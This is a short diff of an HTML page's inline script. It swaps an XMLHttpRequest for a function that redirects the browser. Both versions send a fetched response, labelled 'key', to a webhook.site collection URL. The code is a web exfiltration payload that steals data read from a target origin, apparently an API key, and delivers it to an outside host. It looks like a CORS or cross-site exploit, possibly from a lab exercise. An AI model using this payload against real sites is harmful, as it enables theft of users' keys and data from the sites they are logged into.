@@ -8,9 +8,9 @@
 			req.send();
 			var results = req.responseText;
 			
-			var req2 = new XMLHttpRequest();
-			req2.open('GET', 'https://webhook.site/66aff605-c727-4fd9-a7c7-4a5236cc7a7c/?key=' + results, true);
-			req2.send();
+			function reqListener() {
+				location = "https://webhook.site/66aff605-c727-4fd9-a7c7-4a5236cc7a7c/?key="+results;
+			}
 		</script>
 	</body>
 </html>
